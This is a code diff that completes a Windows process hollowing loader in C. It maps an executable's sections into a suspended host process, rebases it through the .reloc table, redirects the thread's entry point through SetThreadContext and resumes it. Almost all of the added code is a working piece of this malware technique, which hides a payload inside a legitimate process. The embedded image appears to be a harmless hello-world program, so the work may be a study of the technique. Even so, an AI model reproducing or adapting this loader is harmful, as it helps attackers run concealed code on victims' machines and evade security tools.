@@ -15,14 +15,16 @@ INT main() {
 	PLOADED_IMAGE			pImage = NULL;
 	PLOADED_IMAGE			pSourceImage = NULL;
 	PIMAGE_NT_HEADERS32		pSourceHeaders;
+	LPCONTEXT				pContext = NULL;
 	_PPEB					pPEB = NULL;
 	NTSTATUS				ntStatus;
 	HANDLE					hHostProcess;
 	HRSRC					hrsrcHelloWorld;
 	INT						iRet = ERROR_SUCCESS;
 	DWORD					dwExeSize;
+	DWORD					dwDelta;
 	HGLOBAL					hgExe;
-	PVOID					pBuffer = NULL;
+	PBYTE 					pBuffer = NULL;
 	PVOID					pRemoteImage;
 
 	// Function pointers
@@ -107,12 +109,12 @@ INT main() {
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE);
 	if (!pRemoteImage) {
-		printf("VirtualAllocEx call failed\r\n");
+		printf("[-] VirtualAllocEx call failed\r\n");
 		iRet = GetLastError();
 		goto lblCleanup;
 	}
 
-	DWORD dwDelta = (DWORD)pPEB->lpImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
+	dwDelta = (DWORD)pPEB->lpImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
 	
 	printf("[*] Source image base: 0x%p\r\n", pSourceHeaders->OptionalHeader.ImageBase);
 	printf("[*] Destination image base: 0x%p\r\n", pPEB->lpImageBaseAddress);
@@ -124,12 +126,117 @@ INT main() {
 		pSourceHeaders->OptionalHeader.SizeOfHeaders,
 		0)) 
 	{
-		printf("Error writing process memory\r\n");
+		printf("[-] Error writing process memory\r\n");
 		iRet = GetLastError();
 		goto lblCleanup;
 	}
 
-	
+	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++) {
+		if (!pSourceImage->Sections[x].PointerToRawData)
+			continue;
+
+		PVOID pSectionDestination = (PVOID)((DWORD)pPEB->lpImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
+
+		printf("[*] Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
+
+		if (!WriteProcessMemory(hHostProcess,
+			pSectionDestination,
+			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
+			pSourceImage->Sections[x].SizeOfRawData,
+			0))
+		{
+			printf("[-] Error writing process memory\r\n");
+			iRet = GetLastError();
+			goto lblCleanup;
+		}
+	}
+
+	if (dwDelta)
+		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++) {
+			PCHAR pSectionName = ".reloc";
+
+			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
+				continue;
+
+			printf("[*] Rebasing image\r\n");
+
+			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
+			DWORD dwOffset = 0;
+
+			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+			while (dwOffset < relocData.Size) {
+				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
+
+				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
+
+				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
+
+				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
+
+				for (DWORD y = 0; y < dwEntryCount; y++) {
+					dwOffset += sizeof(BASE_RELOCATION_ENTRY);
+
+					if (pBlocks[y].Type == 0)
+						continue;
+
+					DWORD dwFieldAddress =
+						pBlockheader->PageAddress + pBlocks[y].Offset;
+
+					DWORD dwBuffer = 0;
+					ReadProcessMemory(hHostProcess,
+						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
+						&dwBuffer,
+						sizeof(DWORD),
+						0);
+
+					//printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);
+
+					dwBuffer += dwDelta;
+
+					BOOL bSuccess = WriteProcessMemory(hHostProcess,
+						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
+						&dwBuffer,
+						sizeof(DWORD),
+						0);
+
+					if (!bSuccess)
+						printf("[-] Error writing memory\r\n");
+				}
+			}
+
+			break;
+		}
+
+	DWORD dwEntrypoint = (DWORD)pPEB->lpImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
+
+	pContext = VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+	pContext->ContextFlags = CONTEXT_INTEGER;
+
+	printf("[*] Getting thread context\r\n");
+
+	if (!GetThreadContext(processInformation.hThread, pContext)) {
+		printf("[-] Error getting context\r\n");
+		goto lblCleanup;
+	}
+
+	pContext->Eax = dwEntrypoint;
+
+	printf("[*] Setting thread context\r\n");
+
+	if (!SetThreadContext(processInformation.hThread, pContext)) {
+		printf("[-] Error setting context\r\n");
+		goto lblCleanup;
+	}
+
+	printf("[*] Resuming thread\r\n");
+
+	if (!ResumeThread(processInformation.hThread)) {
+		printf("[-] Error resuming thread\r\n");
+		goto lblCleanup;
+	}
+
+	printf("[+] Process hollowing complete\r\n");
 	
 lblCleanup:
 	if (processInformation.hProcess)
@@ -149,6 +256,9 @@ lblCleanup:
 
 	if (pSourceImage)
 		VirtualFree(pSourceImage, 0, MEM_RELEASE);
+
+	if (pContext)
+		VirtualFree(pContext, 0, MEM_RELEASE);
 
 	return iRet;
 }
